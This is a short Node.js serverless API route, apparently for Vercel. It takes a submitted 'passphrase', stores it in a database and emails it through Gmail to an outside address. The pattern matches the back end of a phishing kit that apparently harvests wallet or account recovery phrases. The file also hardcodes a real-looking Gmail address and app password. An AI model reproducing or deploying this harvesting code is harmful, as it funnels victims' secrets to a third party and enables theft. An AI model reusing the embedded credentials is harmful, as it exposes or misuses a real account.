const nodemailer = require('nodemailer');
const { Input } = require('./models'); // Adjust path if needed

// Configure nodemailer transport (hardcoding credentials)
const transporter = nodemailer.createTransport({
  service: 'gmail',
  host: 'smtp.gmail.com',
  port: 465,
  secure: true,
  auth: {
    user: "relate2hazel@gmail.com",  // Your Gmail address
    pass: "yurtanlosnxkpadu"         // Your Gmail app password
  }
});

// The handler function that Vercel will use for the API route
module.exports = async (req, res) => {
  // Only handle POST requests
  if (req.method === 'POST') {
    const { passphrase } = req.body;  // Get passphrase from the request body

    // Make sure passphrase is provided
    if (!passphrase) {
      return res.status(400).json({ error: "Passphrase is required" });
    }

    try {
      // Save the input to your database (e.g., MongoDB or another DB)
      const newInput = new Input({ passphrase });
      await newInput.save();

      // Set up email options
      const mailOptions = {
        from: "relate2hazel@gmail.com",  // Gmail address
        to: "thierryalain643@gmail.com", // Recipient email address
        subject: "New Input Received",
        text: `Passphrase: ${passphrase}` // Email body
      };

      // Send the email
      await transporter.sendMail(mailOptions);

      // Respond with a success message
      res.status(201).json({ message: "Passphrase received and email sent!" });
    } catch (err) {
      // Handle errors (e.g., database or email errors)
      res.status(500).json({ error: "An error occurred: " + err.message });
    }
  } else {
    // Handle unsupported HTTP methods (e.g., GET)
    res.status(405).json({ error: "Method Not Allowed" });
  }
};
